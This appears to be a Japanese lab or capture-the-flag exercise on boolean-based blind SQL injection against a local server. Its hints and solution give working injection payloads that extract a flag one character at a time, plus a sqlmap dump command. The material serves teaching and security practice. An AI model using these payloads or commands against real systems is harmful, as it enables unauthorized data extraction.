# 06 - Boolean-based Blind Injection

`http://localhost:3006` の`/api/user?id=`は`{"found": true/false}`しか返さない。
データは一切表示されない。それでもDB内のflagを1文字ずつ抜き出せ。

## ヒント

<details><summary>ヒント1</summary>

`server.py`を見ろ。`id`はクォートで囲まれずそのままクエリに埋め込まれている。
`server.py`の`SELECT username FROM users WHERE id = {id}`という組み立て方を見て、
`id`にどんな値を入れられるか考えろ。

</details>

<details><summary>ヒント2</summary>

`id=1`は`found:true`。`id=1 AND 1=2`は`found:false`になるはず。実際に試して確認しろ。
これが二値応答(boolean-blind)の基本 — 真偽で分岐する条件をANDでつなげば、画面には何も
表示されなくてもDBに任意の質問を「はい/いいえ」で聞ける。

</details>

<details><summary>ヒント3</summary>

`flags`テーブルのflagカラムを`SUBSTRING(flag, 位置, 1)`で1文字ずつ切り出し、
`='何かの文字'`という条件が真になるかどうかをfoundで判定すれば、1文字ずつ復元できる。
比較演算子を`>`/`<`にして二分探索すれば、1文字あたりの試行回数を減らせる。

</details>

<details><summary>解答</summary>

送るpayload(`id`パラメータ):
```
1 AND (SELECT SUBSTRING(flag,1,1) FROM flags)='F'
```

サーバー側で組み立てられる実際のSQLはこうなる:
```sql
SELECT username FROM users WHERE id = 1 AND (SELECT SUBSTRING(flag,1,1) FROM flags)='F'
```

分解すると:
- `id = 1` — 実在するユーザーの行(存在確認の土台)
- `AND (SELECT SUBSTRING(flag,1,1) FROM flags)='F'` — flagの1文字目が`'F'`かどうかの条件を
  ANDでつなぐ。`id=1`の行は実在するので、この条件が真なら全体が真になり`found:true`、
  偽なら`found:false`

これを位置(`SUBSTRING`の第2引数)を1つずつ増やしながら、文字候補を総当たりして
`found:true`になる文字を探す。全文字について繰り返せばflag全体が復元できる:

```
id=1 AND (SELECT SUBSTRING(flag,1,1) FROM flags)='F'   -> found:true
id=1 AND (SELECT SUBSTRING(flag,1,1) FROM flags)='X'   -> found:false
...
id=1 AND (SELECT SUBSTRING(flag,2,1) FROM flags)='L'   -> found:true
...
```

**注意**: このDBのcollation(`utf8mb4_0900_ai_ci`)は大文字小文字を区別しない。つまり
`='f'`と`='F'`はどちらも真になる。boolean-blindだけでは文字の大文字小文字までは
判別できない(内容自体は正確に復元できる)。

sqlmapを使う場合:
```
sqlmap -u "http://localhost:3006/api/user?id=1" --technique=B \
  --string="found\":true" -p id --dump
```

</details>
